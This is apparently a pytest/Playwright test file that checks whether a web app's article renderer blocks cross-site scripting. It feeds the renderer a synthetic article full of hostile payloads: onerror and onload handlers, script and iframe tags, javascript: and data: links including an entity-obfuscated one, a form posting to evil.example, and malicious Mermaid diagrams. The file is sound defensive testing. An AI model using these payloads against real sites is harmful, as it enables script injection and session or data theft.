"""Generated article content cannot execute in the reader (review item R06).

One synthetic article carries every vector the review named: active HTML
attributes, script and iframe tags, dangerous links written as markdown
and as raw HTML, inline SVG, and hostile Mermaid. It is opened the way a
reader opens any article, and then the browser is asked what happened.
"""
import json

import pytest

ARTICLE_ID = "20260101-000000__canary__deadbeef"
PWNED = "window.__pwned"

HOSTILE = r"""# Canary article

An ordinary paragraph with **bold** text and `inline code`.

<img src="x" onerror="window.__pwned = 'img onerror'">

<svg onload="window.__pwned = 'svg onload'"><script>window.__pwned = 'svg script'</script></svg>

<script>window.__pwned = 'script tag'</script>

<iframe srcdoc="<script>parent.__pwned = 'iframe srcdoc'</script>"></iframe>

<a id="rawlink" href="javascript:window.__pwned = 'raw anchor'">raw anchor</a>

<form action="https://evil.example/collect"><input name="q"><button>go</button></form>

<img src="/interviews/stats?canary=raw-image">

<details open ontoggle="window.__pwned = 'ontoggle'"><summary>s</summary>x</details>

[a markdown link](javascript:window.__pwned='markdown-link')

[a disguised link](java&#x09;script:window.__pwned='entity-link')

[a data link](data:text/html,<script>parent.__pwned='data-link'</script>)

![a tracking image](/interviews/stats?canary=markdown-image)

![a script image](javascript:window.__pwned='image-src')

[a good link](https://example.com/page "A title")

| Column | Value |
| ------ | ----- |
| rows   | 2     |

```python
print("<b>hello</b>")
```

```mermaid
graph TD
  A["<img src=x onerror=window.__pwned='mermaid-label'>"] --> B[Plain]
  click A "javascript:window.__pwned='mermaid-click'"
  click B call window.alert("mermaid callback")
```

```mermaid
graph LR
  Request --> Response
```
"""


@pytest.fixture
def reader(page, server):
    folder = server.output / ARTICLE_ID
    folder.mkdir(exist_ok=True)
    (folder / "intermediate.md").write_text(HOSTILE, encoding="utf-8")
    (folder / "meta.json").write_text(json.dumps({
        "job_id": "deadbeef", "generated_at": "2026-01-01T00:00:00",
        "title": "Canary article",
        "request": {"topic": "Canary article", "explanation_level": "intermediate"},
        "verification_reports": [], "assets": [],
    }), encoding="utf-8")
    page.goto(f"{server.base}/#/newsroom")
    page.get_by_text("Canary article").first.click()
    page.wait_for_selector("article.prose h1")
    page.wait_for_selector("article.prose .mermaid svg", timeout=15000)
    page.wait_for_timeout(500)          # let anything that was going to fire, fire
    return page


def test_nothing_the_article_carried_was_executed(reader):
    assert reader.evaluate(f"{PWNED} ?? null") is None
    assert reader.dialogs == []


def test_no_active_markup_reached_the_page(reader):
    found = reader.evaluate("""() => {
        const prose = document.querySelector('article.prose');
        const handlers = [...prose.querySelectorAll('*')].flatMap(el =>
            [...el.attributes].filter(a => a.name.startsWith('on')).map(a => el.tagName + ' ' + a.name));
        return {
            handlers,
            scripts: prose.querySelectorAll('script').length,
            frames: prose.querySelectorAll('iframe, object, embed').length,
            forms: prose.querySelectorAll('form, input, button').length,
            svgOutsideDiagrams: [...prose.querySelectorAll('svg')]
                .filter(s => !s.closest('.mermaid')).length,
        };
    }""")

    assert found == {"handlers": [], "scripts": 0, "frames": 0, "forms": 0,
                     "svgOutsideDiagrams": 0}


def test_raw_html_is_shown_as_the_text_it_is(reader):
    text = reader.inner_text("article.prose")

    assert "<script>" in text and "onerror=" in text


def test_every_link_goes_somewhere_safe(reader):
    links = reader.evaluate(
        "() => [...document.querySelectorAll('article.prose a')]"
        ".map(a => [a.textContent, a.getAttribute('href'), a.rel, a.target])")

    assert links, "the good link must survive"
    for text, href, _rel, _target in links:
        # An anchor with no target at all goes nowhere, which is safe.
        assert href is None or href.startswith(
            ("https://", "http://", "mailto:", "#")), (text, href)
    good = next(l for l in links if l[0] == "a good link")
    assert good[1] == "https://example.com/page"
    assert "noopener" in good[2] and good[3] == "_blank"


def test_a_dangerous_link_keeps_its_words_and_loses_its_target(reader):
    text = reader.inner_text("article.prose")

    for words in ("a markdown link", "a disguised link", "a data link"):
        assert words in text
    reader.get_by_text("a markdown link").click()
    assert reader.evaluate(f"{PWNED} ?? null") is None
    assert "#/newsroom" in reader.url, "clicking it must not navigate anywhere"


def test_the_article_cannot_make_the_browser_call_the_api(reader):
    """An image pointed at our own API is fetched WITH the session cookie.
    Reads are the mild case; the point is that content gets no requests."""
    assert [u for u in reader.requested if "canary=" in u] == []
    assert [u for u in reader.requested if "evil.example" in u] == []


def test_ordinary_markdown_still_renders(reader):
    shape = reader.evaluate("""() => {
        const prose = document.querySelector('article.prose');
        return {
            heading: prose.querySelector('h1')?.textContent,
            bold: !!prose.querySelector('strong'),
            tableRows: prose.querySelectorAll('table tr').length,
            code: prose.querySelector('pre code.language-python')?.textContent.trim(),
        };
    }""")

    assert shape == {"heading": "Canary article", "bold": True, "tableRows": 2,
                     "code": 'print("<b>hello</b>")'}


def test_diagrams_render_and_carry_nothing_active(reader):
    diagrams = reader.evaluate("""() => [...document.querySelectorAll('article.prose .mermaid')]
        .map(d => ({
            drawn: !!d.querySelector('svg'),
            scripts: d.querySelectorAll('script').length,
            handlers: [...d.querySelectorAll('*')].flatMap(el =>
                [...el.attributes].filter(a => a.name.startsWith('on')).map(a => a.name)),
            scriptLinks: [...d.querySelectorAll('a')].filter(a =>
                /^\\s*javascript:/i.test(a.getAttribute('href') || a.getAttribute('xlink:href') || '')).length,
        }))""")

    assert len(diagrams) == 2
    assert any(d["drawn"] for d in diagrams), "the honest diagram must still draw"
    for d in diagrams:
        assert d["scripts"] == 0 and d["handlers"] == [] and d["scriptLinks"] == 0


def test_the_page_is_served_with_a_policy_that_forbids_inline_script(server, page):
    response = page.goto(f"{server.base}/")

    policy = response.headers["content-security-policy"]
    assert "script-src 'self'" in policy and "'unsafe-inline'" not in policy.split("script-src")[1].split(";")[0]
    assert "frame-ancestors 'none'" in policy and "object-src 'none'" in policy


def test_the_policy_holds_even_if_sanitising_were_bypassed(reader):
    """The second line, tested on its own: markup injected straight into
    the page, as if the sanitiser had not been there at all."""
    reader.evaluate("""() => {
        const host = document.querySelector('article.prose');
        host.insertAdjacentHTML('beforeend',
            '<img src="x" onerror="window.__pwned = \\'csp-bypass\\'">');
    }""")
    reader.wait_for_timeout(400)

    assert reader.evaluate(f"{PWNED} ?? null") is None


def test_the_page_is_usable_when_a_mode_banner_is_showing(server, page):
    """This server has no provider, so the "not ready" banner is up. The
    banner once sat inside the app's layout row and pushed the page out of
    view: everything was in the DOM and nothing could be seen."""
    page.goto(f"{server.base}/#/newsroom")
    page.wait_for_selector(".mode-banner")

    box = page.locator("main#studio-main").bounding_box()
    banner = page.locator(".mode-banner").bounding_box()

    assert box["width"] > 400 and box["height"] > 200
    assert banner["width"] > box["width"], "the banner spans the app, above it"
